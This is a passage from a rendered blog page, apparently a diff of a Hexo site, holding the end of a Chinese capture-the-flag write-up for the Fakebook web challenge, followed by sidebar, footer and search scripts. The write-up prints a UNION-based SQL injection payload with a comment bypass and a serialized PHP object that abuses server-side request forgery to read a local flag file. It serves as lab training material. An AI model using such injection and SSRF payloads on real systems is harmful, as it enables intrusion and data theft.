+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1 union/**/select 1,group_concat(data),3,4 from users</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:5:&quot;1.com&quot;;&#125; </span><br></pre></td></tr></table></figure>
+<p>&#x2F;robots.txt显示&#x2F;user.php.bak，查出源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function get($url)</span><br><span class="line">&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">    if($httpCode == 404) &#123;</span><br><span class="line">        return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    curl_close($ch);</span><br><span class="line"></span><br><span class="line">    return $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这部分可能存在ssrf,而我们爆出的字段data是序列化后的字符串,说明注册时会序列化我们的信息，回显到页面时再反序列化<br><img src="/img/201.png"><br>这里存在ssrf，data本来回显的是我们自己的博客，但我们把它改为回显flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>改为file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php，并把对应的s改为对应长度29<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<p>查看同一位置的源码，base64解码</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE.html" rel="next" title="php伪协议">
+                <i class="fa fa-chevron-left"></i> php伪协议
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/misc-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.html" rel="prev" title="misc-图片隐写">
+                misc-图片隐写 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1"><span class="nav-number">1.</span> <span class="nav-text">[ACTF2020 新生赛]Exec 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-BJDCTF2020-Easy-MD51"><span class="nav-number">2.</span> <span class="nav-text">BUUCTF [BJDCTF2020]Easy MD51</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="nav-number">2.1.</span> <span class="nav-text">字符串和数字比较</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E5%B8%83%E5%B0%94%E5%9E%8B"><span class="nav-number">2.2.</span> <span class="nav-text">字符串和布尔型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%80%9D0%E2%80%9D%E5%92%8C%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">字符串”0”和科学计数法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strcmp-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E-php5-3%E4%B9%8B%E5%89%8D"><span class="nav-number">2.4.</span> <span class="nav-text">strcmp() 函数漏洞 php5.3之前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">MD5绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8Cmd5%E7%A2%B0%E6%92%9E%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.</span> <span class="nav-text">双md5碰撞绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC"><span class="nav-number">2.7.</span> <span class="nav-text">md5碰撞脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#intval-%E5%87%BD%E6%95%B0"><span class="nav-number">2.8.</span> <span class="nav-text">intval() 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-1"><span class="nav-number">3.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="nav-number">4.</span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('Copied')
+          else $(this).text('Copy failed')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('Copy')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+ 
+</body>
+</html>
